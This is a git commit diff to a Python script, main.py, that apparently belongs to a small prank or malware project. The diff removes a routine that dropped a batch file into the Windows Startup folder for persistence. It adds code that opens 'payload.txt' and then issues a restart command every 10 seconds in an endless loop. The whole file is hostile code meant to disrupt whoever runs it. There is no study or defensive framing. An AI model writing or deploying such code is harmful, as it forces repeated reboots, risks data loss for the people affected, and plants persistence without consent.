fb2010edf325f2eba475226a79085a37399ee3fc
Mubashir Hasan <mubashirhasan716@gmail.com>
2020-12-24 21:04:46 +0530

    now automatically schedules every 10 secs

--- main.py
+++ main.py
@@ -1,15 +1,20 @@
 import os
+import schedule
+import time
 
-cmd= 'shutdown/r'
+cmd= 'start payload.txt'
 os.system(cmd)
 
-import getpass
-USER_NAME = getpass.getuser()
 
 
-def add_to_startup(file_path="C:\Users\hp\Documents\secondVi>"):
-    if file_path == "C:\Users\hp\Documents\secondVi>":
-        file_path = os.path.dirname(os.path.realpath(__file__))
-    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
-    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
-        bat_file.write(r'start "" %s' % file_path)
+def start():
+    import os
+
+    cmd= 'shutdown/r'
+    os.system(cmd)
+
+schedule.every(10).seconds.do(start)
+
+while 1==1:
+    schedule.run_pending()
+    time.sleep(1)
